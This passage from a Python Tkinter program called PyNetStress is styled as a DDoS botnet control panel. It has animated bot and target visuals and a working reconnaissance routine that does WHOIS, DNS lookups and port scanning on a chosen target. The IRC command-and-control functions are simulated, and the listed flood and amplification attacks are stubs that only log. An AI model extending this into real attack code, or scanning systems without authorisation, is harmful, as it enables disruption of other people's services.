        self.server = self.canvas.create_oval(server_x-50, server_y-50, server_x+50, server_y+50, 
                              fill='#cc3333', outline='#ff6666', width=2, tags="server")
        self.canvas.create_text(server_x, server_y, text="TARGET\nSERVER", 
                               fill='white', font=('Arial', 10, 'bold'), tags="server")
        
        # Create bots
        self.bots = []
        for i in range(50):  # Visual representation of bots
            angle = 2 * math.pi * i / 50
            distance = 200 + random.randint(-20, 20)
            x = server_x + distance * math.cos(angle)
            y = server_y + distance * math.sin(angle)
            
            # Draw bot as a small circle
            bot = self.canvas.create_oval(x-8, y-8, x+8, y+8, 
                                         fill='#33cc33', outline='#66ff66', width=1, tags="bot")
            self.bots.append(bot)
            
        # Store positions for animation
        self.server_pos = (server_x, server_y)
        self.bot_positions = [self.canvas.coords(bot)[:2] for bot in self.bots]
        
        # Start animation
        if not self.running:
            self.root.after(100, self.animate_visualization)
    
    def animate_visualization(self):
        """Animate the visualization background"""
        if not self.running:
            # Move bots slightly
            for i, bot in enumerate(self.bots):
                coords = self.canvas.coords(bot)
                dx = random.randint(-3, 3)
                dy = random.randint(-3, 3)
                self.canvas.move(bot, dx, dy)
            
            # Update bot positions
            self.bot_positions = [self.canvas.coords(bot)[:2] for bot in self.bots]
        
        # Schedule next animation
        self.root.after(300, self.animate_visualization)
    
    def animate_attack(self):
        """Animate attack packets"""
        if not self.running:
            return
        
        # Create new packet trails
        server_x, server_y = self.server_pos
        for _ in range(min(10, self.thread_count)):
            bot_idx = random.randint(0, len(self.bot_positions)-1)
            bot_x, bot_y = self.bot_positions[bot_idx]
            bot_x += random.randint(-5, 5)
            bot_y += random.randint(-5, 5)
            
            # Create a line from bot to server
            color = random.choice(['#ff5555', '#ff8888', '#ffbbbb'])
            trail = self.canvas.create_line(bot_x, bot_y, bot_x, bot_y, 
                                          fill=color, width=1, arrow=tk.LAST, 
                                          arrowshape=(8, 10, 5))
            self.packet_trails.append({
                'id': trail,
                'start': (bot_x, bot_y),
                'end': (server_x, server_y),
                'progress': 0,
                'speed': random.uniform(0.05, 0.15)
            })
        
        # Update existing trails
        for trail in self.packet_trails[:]:
            trail['progress'] += trail['speed']
            if trail['progress'] >= 1:
                self.canvas.delete(trail['id'])
                self.packet_trails.remove(trail)
                continue
                
            # Calculate current position
            sx, sy = trail['start']
            ex, ey = trail['end']
            cx = sx + (ex - sx) * trail['progress']
            cy = sy + (ey - sy) * trail['progress']
            
            # Update line position
            self.canvas.coords(trail['id'], sx, sy, cx, cy)
        
        # Continue animation
        self.root.after(50, self.animate_attack)
    
    def start_recon(self):
        """Start reconnaissance on the target"""
        target = self.recon_entry.get()
        if not target:
            return
            
        self.recon_text.configure(state='normal')
        self.recon_text.delete(1.0, tk.END)
        self.recon_text.insert(tk.END, f"Starting reconnaissance on {target}...\n")
        self.recon_text.see(tk.END)
        
        # Start recon in a separate thread
        recon_thread = threading.Thread(target=self.perform_recon, args=(target,), daemon=True)
        recon_thread.start()
    
    def perform_recon(self, target):
        """Perform reconnaissance tasks"""
        try:
            # Get IP address
            try:
                ip = socket.gethostbyname(target)
                self.recon_text.insert(tk.END, f"\nIP Address: {ip}\n")
            except:
                self.recon_text.insert(tk.END, "\nCould not resolve IP address\n")
            
            # Get WHOIS information
            try:
                self.recon_text.insert(tk.END, "\nWHOIS Information:\n")
                whois_result = subprocess.check_output(['whois', target], text=True, stderr=subprocess.DEVNULL)
                self.recon_text.insert(tk.END, whois_result[:2000] + "\n... (truncated)\n")
            except:
                self.recon_text.insert(tk.END, "WHOIS lookup failed\n")
            
            # DNS information
            try:
                self.recon_text.insert(tk.END, "\nDNS Records:\n")
                resolver = dns.resolver.Resolver()
                resolver.timeout = 2
                resolver.lifetime = 2
                
                # A records
                try:
                    answers = resolver.resolve(target, 'A')
                    for rdata in answers:
                        self.recon_text.insert(tk.END, f"A: {rdata.address}\n")
                except:
                    pass
                
                # MX records
                try:
                    answers = resolver.resolve(target, 'MX')
                    for rdata in answers:
                        self.recon_text.insert(tk.END, f"MX: {rdata.exchange} ({rdata.preference})\n")
                except:
                    pass
                
                # NS records
                try:
                    answers = resolver.resolve(target, 'NS')
                    for rdata in answers:
                        self.recon_text.insert(tk.END, f"NS: {rdata.target}\n")
                except:
                    pass
            except:
                self.recon_text.insert(tk.END, "DNS lookup failed\n")
            
            # Port scanning
            try:
                self.recon_text.insert(tk.END, "\nCommon Ports:\n")
                ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 587, 993, 995, 3306, 3389]
                for port in ports:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.5)
                    result = s.connect_ex((ip, port))
                    status = "OPEN" if result == 0 else "closed"
                    self.recon_text.insert(tk.END, f"Port {port}: {status}\n")
                    s.close()
            except:
                self.recon_text.insert(tk.END, "Port scanning failed\n")
            
            self.recon_text.insert(tk.END, "\nReconnaissance complete\n")
        except Exception as e:
            self.recon_text.insert(tk.END, f"\nError: {str(e)}\n")
        finally:
            self.recon_text.configure(state='disabled')
    
    def connect_irc(self):
        """Simulate connecting to IRC server"""
        server = self.irc_server.get()
        channel = self.irc_channel.get()
        self.irc_text.configure(state='normal')
        self.irc_text.delete(1.0, tk.END)
        self.irc_text.insert(tk.END, f"Connecting to IRC server: {server}\n")
        self.irc_text.insert(tk.END, f"Joining channel: {channel}\n")
        self.irc_text.insert(tk.END, "Connection established\n")
        self.irc_text.insert(tk.END, f"Bots will connect with prefix: {self.irc_prefix.get()}\n")
        self.irc_text.configure(state='disabled')
        self.irc_text.see(tk.END)
    
    def disconnect_irc(self):
        """Simulate disconnecting from IRC"""
        self.irc_text.configure(state='normal')
        self.irc_text.insert(tk.END, "\nDisconnected from IRC server\n")
        self.irc_text.configure(state='disabled')
        self.irc_text.see(tk.END)
    
    def send_irc_command(self):
        """Simulate sending IRC command"""
        self.irc_text.configure(state='normal')
        self.irc_text.insert(tk.END, f">> Sending attack command to bots\n")
        self.irc_text.configure(state='disabled')
        self.irc_text.see(tk.END)
    
    def update_method_description(self):
        method = self.method_list.get()
        description = self.method_descriptions.get(method, "No description available")
        
        self.method_text.configure(state='normal')
        self.method_text.delete(1.0, tk.END)
        self.method_text.insert(tk.END, f"Method: {method}\n\n")
        self.method_text.insert(tk.END, description + "\n\n")
        
        # Add technical details
        if method == "HTTP Flood":
            self.method_text.insert(tk.END, "Technical Details:\n")
            self.method_text.insert(tk.END, "- Layer: Application (7)\n")
            self.method_text.insert(tk.END, "- Protocol: HTTP\n")
            self.method_text.insert(tk.END, "- Effectiveness: High against web servers\n")
        elif method == "SYN Flood":
            self.method_text.insert(tk.END, "Technical Details:\n")
            self.method_text.insert(tk.END, "- Layer: Transport (4)\n")
            self.method_text.insert(tk.END, "- Protocol: TCP\n")
            self.method_text.insert(tk.END, "- Exploits: TCP handshake vulnerability\n")
        
        self.method_text.configure(state='disabled')
    
    def apply_settings(self):
        self.log("Settings applied")
        messagebox.showinfo("Settings", "Settings have been applied successfully")
    
    def restore_defaults(self):
        self.max_bots_var.set(10000)
        self.max_threads_var.set(500)
        self.max_duration_var.set(300)
        self.log("Settings restored to defaults")
        messagebox.showinfo("Settings", "Default settings restored")
    
    # Placeholder for other attack methods
    def icmp_flood(self): self.log("ICMP Flood attack started")
    def slowloris(self): self.log("Slowloris attack started")
    def dns_amplification(self): self.log("DNS Amplification attack started")
    def ssdp_attack(self): self.log("SSDP attack started")
    def ntp_amplification(self): self.log("NTP Amplification attack started")
    def memcached_attack(self): self.log("Memcached attack started")
    def ping_of_death(self): self.log("Ping of Death attack started")
    def rudy_attack(self): self.log("RUDY attack started")
    def http_killer_attack(self): self.log("HTTP Killer attack started")

if __name__ == "__main__":
    root = tk.Tk()
    app = PyNetStress(root)
    root.mainloop()